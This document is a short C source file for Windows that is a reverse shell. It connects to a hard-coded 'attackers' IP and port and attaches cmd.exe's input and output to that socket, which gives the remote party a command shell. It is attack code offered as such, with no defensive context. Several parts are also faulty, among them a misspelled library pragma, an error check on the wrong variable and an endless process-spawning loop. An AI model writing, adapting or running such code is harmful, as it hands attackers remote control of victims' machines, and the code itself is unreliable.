#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "w2,_32")

WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in client;
STARTUPINFO si;
PROCESS_INFORMATION pi;

int main(int argc, char* argv[])
{
    //attackers ports

    char *ip = "192.168.1.223";
    short port = 9001;

    //initialize socket lib
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    if(wSock == SOCKET_ERROR)
    {
        printf("[!] WSAStartup failed [!]");
        return 1;
    }

    // create socket
    wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    client.sin_family = AF_INET;
    client.sin_port = htons(port);
    client.sin_addr.s_addr = inet_addr(ip);

    //connect to remote host

    WSAConnect(wSock, (SOCKADDR*)&client, sizeof(client), NULL, NULL, NULL, NULL);

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) wSock;

    // start cmd.exe
    int i = 1;
    while (i > 0)
    {
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        closesocket(wSock);
        WSACleanup();
    }

    return 0;
}